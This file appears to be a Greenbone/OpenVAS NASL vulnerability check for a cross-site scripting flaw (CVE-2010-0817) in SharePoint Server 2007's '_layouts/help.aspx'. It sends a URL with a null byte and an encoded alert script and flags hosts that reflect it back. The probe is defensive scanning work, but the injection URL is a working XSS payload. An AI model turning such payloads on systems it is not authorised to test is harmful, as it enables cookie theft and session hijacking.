if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.103254" );
	script_version( "2020-08-24T15:18:35+0000" );
	script_tag( name: "last_modification", value: "2020-08-24 15:18:35 +0000 (Mon, 24 Aug 2020)" );
	script_tag( name: "creation_date", value: "2011-09-14 13:31:57 +0200 (Wed, 14 Sep 2011)" );
	script_bugtraq_id( 39776 );
	script_cve_id( "CVE-2010-0817" );
	script_tag( name: "cvss_base", value: "4.3" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:M/Au:N/C:N/I:P/A:N" );
	script_name( "Microsoft SharePoint Server 2007 '_layouts/help.aspx' Cross Site Scripting Vulnerability" );
	script_xref( name: "URL", value: "http://www.securityfocus.com/bid/39776" );
	script_xref( name: "URL", value: "http://blogs.technet.com/msrc/archive/2010/04/29/security-advisory-983438-released.aspx" );
	script_xref( name: "URL", value: "http://office.microsoft.com/en-us/sharepointserver/FX100492001033.aspx" );
	script_xref( name: "URL", value: "http://www.htbridge.ch/advisory/xss_in_microsoft_sharepoint_server_2007.html" );
	script_xref( name: "URL", value: "http://www.securityfocus.com/archive/1/511021" );
	script_xref( name: "URL", value: "http://support.avaya.com/css/P8/documents/100089744" );
	script_xref( name: "URL", value: "http://www.microsoft.com/technet/security/advisory/983438" );
	script_xref( name: "URL", value: "https://docs.microsoft.com/en-us/security-updates/securitybulletins/2010/ms10-039" );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_category( ACT_ATTACK );
	script_family( "Web application abuses" );
	script_copyright( "Copyright (C) 2011 Greenbone Networks GmbH" );
	script_dependencies( "gb_get_http_banner.sc", "httpver.sc", "webmirror.sc", "DDI_Directory_Scanner.sc" );
	script_require_ports( "Services/www", 80 );
	script_mandatory_keys( "sharepoint/banner" );
	script_tag( name: "solution", value: "The vendor has released an advisory and updates. Please see the
  references for details." );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_tag( name: "summary", value: "Microsoft SharePoint Server 2007 and SharePoint Services 3.0 are prone
  to a cross-site scripting vulnerability because they fail to properly
  sanitize user-supplied input." );
	script_tag( name: "impact", value: "An attacker may leverage this issue to execute arbitrary script code
  in the browser of an unsuspecting user in the context of the affected site. This may allow the attacker
  to steal cookie-based authentication credentials and to launch other attacks." );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
port = http_get_port( default: 80 );
if(!http_can_host_asp( port: port )){
	exit( 0 );
}
banner = http_get_remote_headers( port: port );
if(!banner || !ContainsString( tolower( banner ), "sharepoint" )){
	exit( 0 );
}
url = NASLString( "/_layouts/help.aspx?cid0=MS.WSS.manifest.xml%00%3Cscript%3Ealert%28%27VT-XSS-Test%27%29%3C/script%3E&tid=X" );
if(http_vuln_check( port: port, url: url, pattern: "<script>alert\\('VT-XSS-Test'\\)</script><br/>", check_header: TRUE )){
	report = http_report_vuln_url( port: port, url: url );
	security_message( port: port, data: report );
	exit( 0 );
}
exit( 99 );

